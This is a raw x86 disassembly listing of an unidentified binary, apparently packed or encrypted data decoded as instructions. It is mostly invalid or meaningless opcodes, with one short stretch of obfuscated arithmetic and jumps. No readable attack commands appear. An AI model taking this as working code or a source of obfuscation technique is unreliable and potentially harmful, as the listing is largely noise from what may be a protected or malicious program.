  413e9c:	jns    0x413e96
  413e9e:	dec    edx
  413e9f:	in     eax,dx
  413ea0:	fdiv   st,st(0)
  413ea2:	add    bl,BYTE PTR [ebx-0x27]
  413ea5:	pop    esp
  413ea6:	out    0xac,al
  413ea8:	(bad)  
  413eaa:	xor    al,0x7
  413eac:	mov    ebx,0x6e18bfec
  413eb1:	frstor [ebx-0x17cd361b]
  413eb7:	sbb    BYTE PTR [edi-0x3167e8f1],dl
  413ebd:	cmp    BYTE PTR [eax],ah
  413ebf:	push   es
  413ec0:	xor    BYTE PTR [ebp+ebx*2+0x62],ah
  413ec4:	ret    0xe418
  413ec7:	lock xchg edi,eax
  413ec9:	arpl   WORD PTR [ebp+0x6be37604],ax
  413ecf:	sbb    dl,cl
  413ed1:	jns    0x413eac
  413ed3:	xchg   DWORD PTR [ebx],esp
  413ed5:	jle    0x413f16
  413ed7:	scas   al,BYTE PTR es:[edi]
  413ed8:	push   ecx
  413ed9:	xor    DWORD PTR [edi],0x67069ace
  413edf:	jmp    DWORD PTR [ebx+0x7b8796c6]
  413ee5:	push   ebx
  413ee6:	mov    edx,DWORD PTR [ebp-0x14]
  413ee9:	mov    DWORD PTR [ebp+0x8],edx
  413eec:	jmp    0x4162e7
  413ef1:	mov    edx,DWORD PTR [ebp+0x8]
  413ef4:	mov    ebx,DWORD PTR [ebp-0x8]
  413ef7:	xor    edx,eax
  413ef9:	xor    ebx,eax
  413efb:	sub    edx,ebx
  413efd:	sub    edx,esi
  413eff:	xor    edx,eax
  413f01:	mov    DWORD PTR [ebp+0x8],edx
  413f04:	mov    edx,DWORD PTR [ebp+0x8]
  413f07:	mov    ebx,DWORD PTR [ebp-0x58]
  413f0a:	add    edx,0x5708f8
  413f10:	imul   edx,ebx
  413f13:	jmp    0x416299
  413f18:	push   eax
  413f19:	pusha  
  413f1a:	clc    
  413f1b:	push   es
  413f1c:	call   0x5435b3a7
  413f21:	add    dh,bh
  413f23:	or     BYTE PTR [esi-0x4a5dfc45],bl
  413f29:	jae    0x413fa5
  413f2b:	jp     0x413f2e
  413f2d:	pop    edi
  413f2e:	jp     0x413faa
  413f30:	(bad)  
  413f31:	out    0x42,eax
  413f33:	cs pop ebp
  413f35:	es inc ecx
  413f37:	ds jo  0x413f21
  413f3a:	mov    dl,0x27
  413f3c:	stos   BYTE PTR es:[edi],al
  413f3d:	jmp    0x2c4b:0xd5c2b2b4
  413f44:	and    ebp,DWORD PTR [esi]
  413f46:	retf   0xe81f
  413f49:	adc    eax,0xbacb68ad
  413f4e:	push   ecx
  413f4f:	icebp  
  413f50:	ins    BYTE PTR es:[edi],dx
  413f51:	aas    
  413f52:	push   cs
  413f53:	adc    esp,DWORD PTR [ebx+0x1d2ece28]
  413f59:	inc    eax
  413f5a:	xchg   eax,edx
  413f5c:	add    eax,0x7135db6e
  413f61:	loopne 0x413fb3
  413f63:	and    eax,0x92a0dc47
  413f68:	jne    0x413f3a
  413f6a:	xor    al,bh
  413f6c:	imul   edi,DWORD PTR [eax],0x8d302faf
  413f72:	and    eax,esi
  413f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f75:	xor    edx,DWORD PTR [edx+esi*1]
  413f78:	das    
  413f79:	and    DWORD PTR [esi+0x502ba3a9],esi
  413f7f:	and    bl,BYTE PTR [edx-0x73a1ba55]
  413f85:	mov    DWORD PTR [ecx],ebx
  413f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f88:	mov    esp,ebx
  413f8a:	sbb    DWORD PTR [edi-0x1f],edx
  413f8d:	in     al,0xf2
  413f8f:	sbb    ecx,esp
  413f91:	push   0xffffff8d
  413f93:	cmp    eax,0xbbeae1cc
  413f98:	sti    
  413f99:	mov    al,ds:0x89273a90
  413f9e:	mov    edx,0xc258d751
  413fa3:	mov    eax,ds:0xa626661c
  413fa8:	jb     0x41401a
  413faa:	sub    ecx,DWORD PTR [ebp-0x32f5f9a1]
  413fb0:	push   ds
  413fb1:	nop
  413fb2:	outs   dx,BYTE PTR ds:[esi]
  413fb3:	jl     0x413f85
  413fb5:	stos   BYTE PTR es:[edi],al
  413fb6:	push   0xffffff84
  413fb8:	mov    ebp,0x82c62f7
  413fbd:	sti    
  413fbe:	rcr    BYTE PTR [esi-0x35],1
  413fc1:	cmp    DWORD PTR [ecx+0x3a],0x41
  413fc5:	(bad)  
  413fc6:	sbb    eax,0x80e5a03c
  413fcb:	int3   
  413fcc:	cs pop es
  413fce:	stos   BYTE PTR es:[edi],al
  413fcf:	jb     0x413fa7
  413fd1:	sub    esp,DWORD PTR [ecx-0x6f1f8d3a]
  413fd7:	pop    eax
  413fd8:	sub    al,0xfd
  413fda:	adc    BYTE PTR [ecx],dh
  413fdc:	wbinvd 
  413fde:	sti    
  413fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fe0:	ds mov esi,0xcd54280f
  413fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fe7:	aas    
  413fe8:	and    BYTE PTR [ecx-0x46dc45cf],dl
  413fee:	push   ds
  413fef:	inc    ecx
  413ff0:	xchg   ebx,eax
  413ff1:	add    BYTE PTR fs:[ecx-0xe],bl
  413ff5:	cmp    BYTE PTR [edx+edx*2],cl
  413ff8:	pop    ecx
  413ff9:	fld    TBYTE PTR [edi-0x67]
  413ffc:	jmp    0x41403c
  413ffe:	cmp    ebp,DWORD PTR [esi+0x51]
  414001:	jne    0x414059
  414003:	rcl    edx,1
  414005:	ret    0x1025
  414008:	cmp    al,0x36
  41400a:	xor    BYTE PTR [eax+0x284a7cea],cl
  414010:	adc    BYTE PTR [eax],bh
  414012:	repnz dec ebp
  414014:	in     al,0x65
  414016:	js     0x414071
  414018:	add    bh,BYTE PTR [ecx+0x0]
  41401b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41401c:	jnp    0x414084
  41401e:	sub    esi,DWORD PTR [edx+0x42]
  414021:	inc    ecx
  414022:	frstor [edx+0x43]
  414025:	push   cs
  414026:	stos   DWORD PTR es:[edi],eax
  414027:	mov    cl,0x2d
  414029:	test   bh,al
  41402b:	or     esi,DWORD PTR [edx]
  41402d:	adc    BYTE PTR [ebx+0x7087d261],0x60
  414034:	iret   
  414035:	and    DWORD PTR [eax],0x70
  414038:	call   0x1859b292
  41403d:	push   ss
  41403e:	out    0xb3,eax
  414040:	mov    WORD PTR [ecx+edx*1],fs
  414043:	mov    bh,0x28
  414045:	stc    
  414046:	(bad)  
  414047:	data16 fidivr DWORD PTR [ebx]
  41404a:	pop    ebx
  41404b:	(bad)  
  41404d:	lds    ecx,FWORD PTR [ebx+ebp*1]
  414050:	xor    eax,eax
  414052:	add    eax,0xec686d90
  414057:	ins    BYTE PTR es:[edi],dx
  414058:	jecxz  0x414090
  41405a:	addr16 rol edx,cl
  41405d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41405e:	test   eax,0xa4b968c8
  414063:	and    bl,BYTE PTR [eax+0x16811ded]
  414069:	fwait
  41406a:	sub    ch,BYTE PTR [edx]
  41406c:	in     eax,0xb4
  41406e:	inc    edi
  41406f:	inc    eax
  414070:	scas   eax,DWORD PTR es:[edi]
  414071:	push   ss
  414072:	push   0xa773a1e4
  414077:	popf   
  414078:	mov    ebx,0xbaba9d41
  41407d:	xchg   esp,esp
  41407f:	dec    ecx
  414080:	jge    0x41408a
  414082:	sahf   
  414083:	fcomp  QWORD PTR [eax]
  414085:	adc    BYTE PTR [ebx],ah
  414087:	not    bx
  41408a:	dec    edx
  41408b:	mov    al,ds:0x6641b097
  414090:	imul   ebx,DWORD PTR [ebx+eiz*8+0x15],0xffffff8c
  414095:	adc    ecx,esp
  414097:	(bad)  
  414098:	push   cs
  414099:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41409b:	mov    al,ds:0xb087c4e6
  4140a0:	sbb    eax,DWORD PTR [edi-0x185cf710]
  4140a6:	mov    dl,0xa9
  4140a8:	test   BYTE PTR [edx+0x12841e73],dh
  4140ae:	mov    esi,DWORD PTR [ecx-0x12]
  4140b1:	sub    BYTE PTR [edi+0x7c],cl
  4140b4:	fadd   QWORD PTR [ebx-0x6]
  4140b7:	and    BYTE PTR [esp+ebx*1+0x7c],bh
  4140bb:	push   ss
  4140bc:	pop    ebx
  4140bd:	mov    DWORD PTR [ecx],ebx
  4140bf:	mov    eax,0xc6bfd04
  4140c4:	push   bx
  4140c6:	push   ss
  4140c7:	lds    edi,FWORD PTR [ecx]
  4140c9:	aad    0x7b
  4140cb:	fdiv   QWORD PTR [esi-0x27]
  4140ce:	sahf   
  4140cf:	mov    al,ds:0x352b4e1d
  4140d4:	je     0x414154
  4140d6:	xchg   ecx,eax
  4140d7:	jbe    0x41405e
  4140d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140da:	in     eax,dx
  4140db:	aad    0xca
  4140dd:	add    BYTE PTR [edi+esi*1],0xc4
  4140e1:	push   es
  4140e2:	and    al,0x14
  4140e4:	adc    DWORD PTR [ebx],edi
  4140e6:	cmp    eax,0xd8d50230
  4140eb:	xor    DWORD PTR [edi],esp
  4140ed:	vorps  xmm4,xmm6,XMMWORD PTR [edx+0x7c]
  4140f2:	add    DWORD PTR ds:0x851b766f,esp
  4140f8:	mov    bh,0x80
  4140fa:	cs out 0x7,al
  4140fd:	(bad)  
  4140fe:	sbb    eax,0xeb0bd70d
  414103:	clc    
  414104:	cwde   
  414105:	rcr    DWORD PTR [ebp+0x19],cl
  414108:	inc    edx
  414109:	mov    ah,bl
  41410b:	out    dx,eax
  41410c:	push   0xffffffb3
  41410e:	or     eax,edx
  414110:	pop    eax
  414111:	clc    
  414112:	sub    eax,0x7022272c
  414117:	out    dx,al
  414118:	push   cs
  414119:	or     eax,ebx
  41411b:	sub    DWORD PTR [esi+0x38],esi
  41411e:	dec    edx
  41411f:	inc    edx
  414120:	iret   
  414121:	adc    BYTE PTR [ebx],dh
  414123:	xchg   ebp,eax
  414124:	mov    dh,0x95
  414126:	repz adc bh,BYTE PTR [ebx+ebx*1]
  41412a:	mov    eax,0x285cb965
  41412f:	dec    ebp
  414130:	mov    eax,ds:0xfb2fc0c6
  414135:	sbb    al,BYTE PTR [esi+0x17]
  414138:	inc    ebp
  414139:	or     BYTE PTR [eax],ah
  41413b:	ret    0x3788
  41413e:	out    0x1,eax
  414140:	fldcw  WORD PTR [ebx]
  414142:	mov    al,0x2d
  414144:	push   ds
  414145:	xlat   BYTE PTR ds:[ebx]
  414146:	enter  0x89cb,0x85
  41414a:	leave  
  41414b:	pop    esp
  41414c:	or     al,0x2c
  41414e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41414f:	stos   DWORD PTR es:[edi],eax
  414150:	int    0x28
  414152:	popf   
  414153:	fyl2x  
  414155:	dec    eax
  414156:	jo     0x414101
  414158:	sub    ah,0x6f
  41415b:	mov    esi,DWORD PTR [eax+0x59]
  41415e:	mov    al,ds:0xe0ce54b7
  414163:	jne    0x414134
  414165:	mov    al,0x9c
  414167:	fidivr WORD PTR [eax+0x23112f04]
  41416d:	xsaveopt [edi+0x16]
  414171:	call   0x25d62dc9
  414176:	xchg   esp,eax
  414177:	push   ecx
  414178:	sti    
  414179:	scas   al,BYTE PTR es:[edi]
  41417a:	push   ebp
  41417b:	repz jp 0x41415b
  41417e:	les    ebx,FWORD PTR [edi]
  414180:	mov    ah,0xc2
  414182:	hlt    
  414183:	or     eax,0x93eb1164
  414188:	dec    eax
  414189:	xor    DWORD PTR [edi-0x231e929f],eax
  41418f:	push   0x49a69bb0
  414194:	repnz mov ebx,0x2953b00b
  41419a:	iret   
  41419b:	push   es
  41419c:	(bad)  
  41419d:	fild   DWORD PTR [ebp-0x5f]
  4141a0:	fild   WORD PTR [edx-0x42]
  4141a3:	sbb    ebx,ecx
  4141a5:	adc    edx,DWORD PTR [eax]
  4141a7:	mov    esi,0xe63123a5
  4141ac:	loope  0x4141b2
  4141ae:	out    dx,eax
  4141af:	push   edi
  4141b0:	mov    ds,WORD PTR [esi-0x77]
  4141b3:	jge    0x4141b2
  4141b5:	in     eax,dx
  4141b6:	and    BYTE PTR [ebx+0x31],0xa6
  4141ba:	out    dx,al
  4141bb:	xor    ebx,DWORD PTR [ebx+esi*2-0x3e46c7f3]
  4141c2:	in     al,dx
  4141c3:	add    edx,ecx
  4141c5:	dec    edx
  4141c6:	mov    edi,DWORD PTR [edi]
  4141c8:	scas   al,BYTE PTR es:[edi]
  4141c9:	stc    
  4141ca:	mov    al,0x6e
  4141cc:	das    
  4141cd:	mov    ch,0xf7
  4141cf:	pushf  
  4141d0:	mov    eax,0xa7083b4
  4141d5:	mov    ecx,0xe38f8fdc
  4141da:	enter  0x64e8,0x7c
  4141de:	mov    eax,DWORD PTR ds:0x872d7253
  4141e4:	js     0x414199
  4141e6:	sub    eax,0x4d9c2025
  4141eb:	fsub   DWORD PTR [ebx-0x7f]
  4141ee:	test   al,0xb8
  4141f0:	pop    ecx
  4141f1:	nop
  4141f2:	dec    ebp
  4141f3:	aam    0xa1
  4141f5:	adc    DWORD PTR [ecx+0x6f],esi
  4141f8:	jb     0x41423f
  4141fa:	xor    ah,BYTE PTR [esi-0x37]
  4141fd:	mov    esp,0xce010ab8
  414202:	sbb    ch,ch
  414204:	or     esp,ebx
  414206:	sbb    DWORD PTR [ecx-0x48051cbf],edi
  41420c:	add    al,bh
  41420e:	stos   BYTE PTR es:[edi],al
  41420f:	call   0x4873:0x83adc870
  414216:	push   ebp
  414217:	inc    ecx
  414218:	jns    0x41428a
  41421a:	xor    cl,BYTE PTR [eax-0x17]
  41421d:	sar    BYTE PTR [esi],cl
  41421f:	push   eax
  414220:	pop    ds
  414221:	adc    ch,BYTE PTR [ebx-0x796f0bcf]
  414227:	ret    
  414228:	push   0x8
  41422a:	imul   esp,DWORD PTR [edi],0x96bb33c8
  414230:	inc    ecx
  414231:	dec    ebp
  414232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414233:	fimul  WORD PTR [edx-0x7d887867]
  414239:	sub    bh,BYTE PTR [esi*1+0x1424b6e]
  414240:	fiadd  DWORD PTR [ecx+0x56]
  414243:	int3   
  414244:	cld    
  414245:	test   al,0x8c
  414247:	dec    eax
  414248:	cmovb  edi,DWORD PTR [edi+ebp*8+0x4894207d]
  414250:	mov    al,0xc4
  414252:	mov    esi,0xe2263045
  414257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414258:	mov    ebp,0x3e35c611
  41425d:	std    
  41425e:	jnp    0x414245
  414260:	pop    ebx
  414261:	into   
  414262:	push   0xba8e6500
  414267:	xor    esp,ebx
  414269:	push   ebp
  41426a:	test   BYTE PTR [ebx],ah
  41426c:	xchg   edx,eax
  41426d:	sbb    eax,0x6cc88810
  414272:	xchg   edx,eax
  414273:	xchg   esi,eax
  414274:	cs inc edi
  414276:	jecxz  0x414248
  414278:	stos   DWORD PTR es:[edi],eax
  414279:	test   al,0x20
  41427b:	shr    DWORD PTR [esi+0x16dd0082],0x1
  414282:	lea    ebp,[ebx+0x79]
  414285:	imul   ebp,ebp,0x60290c5e
  41428b:	cwde   
  41428c:	(bad)  
  41428d:	or     ah,al
  41428f:	pop    ds
  414290:	and    DWORD PTR [edx],ebx
  414292:	jbe    0x41424b
  414294:	xor    DWORD PTR [eax],esi
  414296:	and    ebp,eax
  414298:	addr16 jno 0x4142ef
  41429b:	cmc    
  41429c:	ins    BYTE PTR es:[edi],dx
  41429d:	dec    ebx
  41429e:	mov    al,0x13
  4142a0:	add    BYTE PTR [ebp+0x380115d3],ch
  4142a6:	cli    
  4142a7:	mov    ebx,0x381ff535
  4142ac:	outs   dx,DWORD PTR ds:[esi]
  4142ad:	imul   eax,ecx,0xffffffa8
  4142b0:	fld    DWORD PTR [eax]
  4142b2:	sub    ebx,DWORD PTR [ecx-0x64375f37]
  4142b8:	leave  
  4142b9:	xchg   ecx,eax
  4142ba:	cmp    eax,DWORD PTR [ebp+0x10]
  4142bd:	xchg   ebx,eax
  4142be:	ficomp WORD PTR [edx-0x2c8d26e1]
  4142c4:	push   es
  4142c5:	dec    esi
  4142c6:	xchg   BYTE PTR [esi-0x4a],cl
  4142c9:	cmp    DWORD PTR [ecx-0x1a],esp
  4142cc:	inc    esi
  4142cd:	sbb    esi,eax
  4142cf:	sbb    ebp,DWORD PTR [edx+0x47]
  4142d2:	cld    
  4142d3:	xor    cl,cl
  4142d5:	cdq    
  4142d6:	(bad)  
  4142d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142d9:	add    al,dh
  4142db:	dec    ebp
  4142dc:	test   al,0x24
  4142de:	call   0x64657ed8
  4142e3:	mov    edi,0x276450e2
  4142e8:	and    esp,DWORD PTR [eax-0xb40989b]
  4142ee:	bound  esi,QWORD PTR [esi]
  4142f0:	outs   dx,BYTE PTR ds:[esi]
  4142f1:	push   edx
  4142f2:	lock repz into 
  4142f5:	add    ebp,ebp
  4142f7:	ss dec esi
  4142f9:	push   ebp
  4142fa:	leave  
  4142fb:	mov    edx,0xacad978e
  414300:	xor    eax,0xeb0aaaa6
  414305:	dec    ebx
  414306:	sub    esp,DWORD PTR [esi+0x7c]
  414309:	push   edi
  41430a:	mov    ecx,0x829f3917
  41430f:	xlat   BYTE PTR ds:[ebx]
  414310:	adc    DWORD PTR [edx],ecx
  414312:	test   al,0xc8
  414314:	push   ss
  414315:	or     ch,bl
  414317:	je     0x4142be
  414319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41431a:	push   ds
  41431b:	xor    bl,BYTE PTR [ebx]
  41431d:	sub    al,0x78
  41431f:	sbb    bl,BYTE PTR [ecx-0x63dee28c]
  414325:	ins    DWORD PTR es:[edi],dx
  414326:	lds    eax,FWORD PTR [esi]
  414328:	scas   eax,DWORD PTR es:[edi]
  414329:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41432b:	idiv   BYTE PTR [edx+edx*8]
  41432e:	mov    edx,0x7b827291
  414333:	mov    eax,0xb7f3baf3
  414338:	mov    esp,esp
  41433a:	iret   
  41433b:	sub    eax,0xf44e1cb2
  414340:	and    al,0xe2
  414342:	pop    ecx
  414343:	sbb    eax,0xb9df7b26
  414348:	push   esi
  414349:	not    DWORD PTR [esi+0x3]
  41434c:	(bad)  
  41434d:	leave  
  41434e:	sahf   
  41434f:	imul   eax,DWORD PTR [edx+0x5f],0xd4647095
  414356:	push   ecx
  414357:	or     DWORD PTR [eax+0x2c2ab795],ebp
  41435d:	jg     0x414350
  41435f:	loop   0x4143c0
  414361:	fist   DWORD PTR [edi-0x54]
  414364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414365:	nop
  414366:	mov    al,ds:0x9aeac06a
  41436b:	add    al,BYTE PTR [ecx]
  41436d:	or     DWORD PTR [ebp-0x32],eax
  414370:	pop    ss
  414371:	add    dh,ch
  414373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414374:	or     al,BYTE PTR [esi-0x651d555e]
  41437a:	rcr    BYTE PTR [edi+ebp*8-0x7747b445],0xf9
  414382:	mov    ds:0xdffcb685,al
  414387:	mov    ebx,0x990cc14a
  41438c:	(bad)  
  41438d:	xor    DWORD PTR [esi+ecx*2+0x23],edi
  414391:	mov    bl,0x10
  414393:	pop    esi
  414394:	pop    ebx
  414395:	mov    esi,eax
  414397:	xor    al,0xec
  414399:	pusha  
  41439a:	cmp    al,0x2a
  41439c:	pop    eax
  41439d:	xchg   ecx,eax
  41439e:	cdq    
  41439f:	pop    ecx
  4143a0:	ins    DWORD PTR es:[edi],dx
  4143a1:	and    BYTE PTR [esi],dl
  4143a3:	sahf   
  4143a4:	lea    edx,[edi+0x2093381]
  4143aa:	pushf  
  4143ab:	shr    BYTE PTR [ecx],0x3d
  4143ae:	cli    
  4143af:	inc    esi
  4143b0:	jg     0x414381
  4143b2:	mov    bl,0x19
  4143b4:	jle    0x41441c
  4143b6:	mov    al,ds:0x40b18bf4
  4143bb:	jp     0x4143d5
  4143bd:	iret   
  4143be:	or     eax,0x49b8b36d
  4143c3:	add    ebp,edx
  4143c5:	(bad)  
  4143c6:	xor    ch,BYTE PTR [ebp+0x4ea5270c]
  4143cc:	ds lock xchg edx,eax
  4143cf:	xor    al,0xa5
  4143d1:	int3   
  4143d2:	jp     0x4143ca
  4143d4:	rcr    BYTE PTR [edi+0x32941bff],1
  4143da:	add    ch,dl
  4143dc:	loopne 0x4143a9
  4143de:	and    ah,0xfb
  4143e1:	mov    dh,0x84
  4143e3:	test   al,0xfb
  4143e5:	mov    esp,0xf921a27b
  4143ea:	mov    cl,0x52
  4143ec:	xchg   edi,eax
  4143ed:	adc    bl,bh
  4143ef:	mov    ebp,0x6f2b3151
  4143f4:	fistp  DWORD PTR [ebp+ebp*2+0x10]
  4143f8:	add    cl,BYTE PTR [eax-0x53]
  4143fb:	fnstsw WORD PTR [ebp+0xe32e484]
  414401:	adc    DWORD PTR [edi+0x14],edx
  414404:	neg    BYTE PTR [ebx+0x7eaa8cf0]
  41440a:	xchg   edi,eax
  41440b:	adc    al,0x53
  41440d:	jp     0x41441e
  41440f:	fdiv   st(7),st
  414411:	jno    0x414491
  414413:	push   edi
  414414:	jnp    0x414409
  414416:	mov    al,ds:0xe0e05472
  41441b:	lea    esi,[ecx+ebp*1]
  41441e:	jl     0x41449a
  414420:	push   ecx
  414421:	call   0xc50044e7
  414426:	repz and cl,BYTE PTR [edx-0x25c8a135]
  41442d:	retf   0x6d7c
  414430:	scas   al,BYTE PTR es:[edi]
  414431:	pop    edi
  414432:	cli    
  414433:	push   ss
  414434:	out    0x7,al
  414436:	ficom  WORD PTR ds:0x19cd8d57
  41443c:	shl    DWORD PTR [esi],0x9e
  41443f:	mov    ebp,DWORD PTR [edi-0x2a]
  414442:	stos   DWORD PTR es:[edi],eax
  414443:	xchg   DWORD PTR [ebx+0x7d],esi
  414446:	fucomp st(3)
  414448:	xor    DWORD PTR [ebp+0x3d0661bd],0x19
  41444f:	inc    edi
  414450:	inc    ebx
  414451:	jmp    0xd3a38d21
  414456:	cwde   
  414457:	shr    esp,0xe3
  41445a:	ins    DWORD PTR es:[edi],dx
  41445b:	outs   dx,DWORD PTR ds:[esi]
  41445c:	adc    eax,0xa94fae49
  414461:	in     eax,0xb7
  414463:	sub    BYTE PTR fs:[edx-0x72],0x2e
  414468:	mov    esp,0x83bc3f75
  41446d:	fadd   st(1),st
  41446f:	scas   al,BYTE PTR es:[edi]
  414470:	and    al,0xb9
  414472:	repnz add esp,DWORD PTR [eax+0x1f486f4d]
  414479:	inc    ebp
  41447a:	int3   
  41447b:	sti    
  41447c:	mov    ds:0xe09d57e6,al
  414481:	xor    edi,DWORD PTR [ecx+0x75]
  414484:	push   eax
  414485:	add    eax,0xa308a2d
  41448a:	jae    0x414496
  41448c:	popa   
  41448d:	mov    ebp,DWORD PTR [edx+0x7]
  414490:	fwait
  414491:	aaa    
  414492:	push   ebx
  414493:	sub    eax,DWORD PTR [ecx]
  414495:	cmp    ebp,ecx
  414497:	sub    BYTE PTR [ebp-0x34],al
  41449a:	add    al,0x5b
  41449c:	or     ah,0x99
  41449f:	pop    ds
  4144a0:	inc    eax
  4144a1:	test   al,bl
  4144a3:	cld    
  4144a4:	push   edx
  4144a5:	dec    esp
  4144a6:	mov    esi,0x5bf6749c
  4144ab:	pop    esp
  4144ac:	cmp    eax,0x6a348761
  4144b1:	ror    ebp,cl
  4144b3:	mov    dh,0x33
  4144b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144b6:	inc    edi
  4144b7:	test   edi,esi
  4144b9:	dec    ecx
  4144ba:	ja     0x4144dc
  4144bc:	pop    ecx
  4144bd:	js     0x414532
  4144bf:	ret    
  4144c0:	popf   
  4144c1:	push   eax
  4144c2:	fldenv [edx]
  4144c4:	or     al,dh
  4144c6:	push   edx
  4144c7:	iret   
  4144c8:	stc    
  4144c9:	fwait
  4144ca:	push   0xccd516ca
  4144cf:	inc    eax
  4144d0:	loopne 0x4144ca
  4144d2:	imul   edi,DWORD PTR [ebx-0x6b],0x5f
  4144d6:	retf   0x488d
  4144d9:	gs in  al,dx
  4144db:	inc    ebp
  4144dc:	out    dx,al
  4144dd:	mov    esi,0xa9fb3a6d
  4144e2:	mov    al,ds:0x1f3ae638
  4144e7:	(bad)  
  4144e8:	aam    0xfd
  4144ea:	repz dec ecx
  4144ec:	jbe    0x41448f
  4144ee:	push   eax
  4144ef:	mov    bl,0x9d
  4144f1:	(bad)  
  4144f2:	mov    eax,0xeed0b8c8
  4144f7:	adc    BYTE PTR [eax-0x51],0x95
  4144fb:	cld    
  4144fc:	scas   al,BYTE PTR es:[edi]
  4144fd:	mov    edx,0xaef0d1ec
  414502:	fcomp  QWORD PTR [ebp+0x343db684]
  414508:	data16 jecxz 0x4144b6
  41450b:	sbb    DWORD PTR [edx],edi
  41450d:	test   ah,bl
  41450f:	inc    esp
  414510:	lods   eax,DWORD PTR ds:[esi]
  414511:	dec    ebp
  414512:	data16 fild QWORD PTR [ecx-0x13ba961c]
  414519:	mov    al,0xf0
  41451b:	mov    edi,0x62b28d81
  414520:	in     al,dx
  414521:	mov    eax,ds:0xf0e3c755
  414526:	test   DWORD PTR [ecx-0x7d796d7f],edx
  41452c:	mov    esi,0x452f364e
  414531:	dec    esi
  414532:	xchg   esi,eax
  414533:	(bad)  
  414534:	icebp  
  414535:	fs push ds
  414537:	daa    
  414538:	sahf   
  414539:	and    eax,0x8a7f515d
  41453e:	jecxz  0x41450a
  414540:	mov    cl,0x61
  414542:	je     0x41454c
  414544:	xor    eax,0x9f13f2eb
  414549:	out    0x11,eax
  41454b:	enter  0xdf40,0x66
  41454f:	sub    edx,DWORD PTR [ebx+0x55719acd]
  414555:	pop    es
  414556:	retf   
  414557:	mov    esp,0xde7fbe00
  41455c:	ss xchg ecx,eax
  41455e:	jno    0x4144f1
  414560:	inc    ecx
  414561:	setge  BYTE PTR [ebx]
  414564:	imul   edx,DWORD PTR [eax-0x7869a280],0x31dd497e
  41456e:	imul   ebp,ebx,0xffffffc2
  414571:	mov    al,ss:0x9a886127
  414577:	aad    0xc3
  414579:	and    esi,DWORD PTR [esi+0x41]
  41457c:	sbb    eax,0xdb13ce3f
  414581:	outs   dx,DWORD PTR ds:[esi]
  414582:	scas   al,BYTE PTR es:[edi]
  414583:	push   eax
  414584:	inc    edx
  414585:	dec    ebx
  414586:	inc    ebx
  414587:	xchg   ebx,eax
  414588:	retf   0x416d
  41458b:	js     0x414542
  41458d:	mov    dl,0x4f
  41458f:	and    ch,bh
  414591:	mov    bl,ah
  414593:	inc    ebp
  414594:	xchg   ecx,eax
  414595:	jae    0x4145d6
  414597:	mov    dl,bh
  414599:	cmp    eax,0x3d14045f
  41459e:	pop    ds
  41459f:	adc    al,0xad
  4145a1:	mov    WORD PTR [edx],?
  4145a3:	or     cl,BYTE PTR [esi]
  4145a5:	enter  0x1692,0x2c
  4145a9:	mov    ebx,0xb97465c1
  4145ae:	push   edx
  4145af:	jp     0x4145b2
  4145b1:	sub    BYTE PTR ds:0xa682aa36,0x9b
  4145b8:	aam    0xf9
  4145ba:	das    
  4145bb:	paddusw mm6,mm3
  4145be:	and    DWORD PTR [eax-0x67c5a57e],0x52639c60
  4145c8:	nop
  4145c9:	test   al,0x5f
  4145cb:	jmp    0xfe2707b
  4145d0:	sbb    al,0xc3
  4145d2:	jbe    0x414580
  4145d4:	into   
  4145d5:	xchg   esp,ecx
  4145d7:	out    dx,eax
  4145d8:	and    edi,eax
  4145da:	push   ss
  4145db:	xchg   esp,eax
  4145dc:	or     DWORD PTR [ecx-0x77d845b],edx
  4145e2:	std    
  4145e3:	pop    es
  4145e4:	dec    esp
  4145e5:	push   0xffffffbe
  4145e7:	out    0x8e,eax
  4145e9:	pop    ss
  4145ea:	jl     0x41464e
  4145ec:	jmp    0xb41f:0x8852e118
  4145f3:	hlt    
  4145f4:	and    eax,0x947490
  4145f9:	pushf  
  4145fa:	cld    
  4145fb:	push   esi
  4145fc:	sbb    dl,al
  4145fe:	jecxz  0x4145ff
  414600:	push   cs
  414601:	push   ebx
  414602:	std    
  414603:	fist   WORD PTR [edx-0x31]
  414606:	lea    eax,[edi]
  414608:	sahf   
  414609:	scas   al,BYTE PTR es:[edi]
  41460a:	jp     0x4145ac
  41460c:	push   cs
  41460d:	pop    ebx
  41460e:	fisubr WORD PTR [ecx]
  414610:	dec    esp
  414611:	ficomp WORD PTR ds:0x9716b084
  414617:	mov    esp,0x7fc4eaa7
  41461c:	push   es
  41461d:	mov    edi,0xa451faf3
  414622:	xchg   ecx,eax
  414623:	pop    edx
  414624:	or     ebx,DWORD PTR [eax-0xb4bd582]
  41462a:	popf   
  41462b:	pop    esi
  41462c:	mov    ch,0xcf
  41462e:	in     al,dx
  41462f:	pop    edi
  414630:	mov    edx,DWORD PTR [ebp-0x1f980788]
  414636:	inc    esp
  414637:	jae    0x4146b5
  414639:	jecxz  0x41462d
  41463b:	aas    
  41463c:	lods   al,BYTE PTR ds:[esi]
  41463d:	inc    eax
  41463e:	aaa    
  41463f:	push   ss
  414640:	and    BYTE PTR [eax],cl
  414642:	int    0xbf
  414644:	in     al,dx
  414645:	jb     0x414606
  414647:	mov    dl,0x18
  414649:	push   esi
  41464a:	mov    bl,0xa6
  41464c:	jne    0x41464c
  41464e:	pop    edi
  41464f:	and    esi,DWORD PTR [ecx-0x6b]
  414652:	cli    
  414653:	mov    ebx,0x34fb709b
  414658:	add    BYTE PTR [edx],0x44
  41465b:	dec    ebp
  41465c:	push   edx
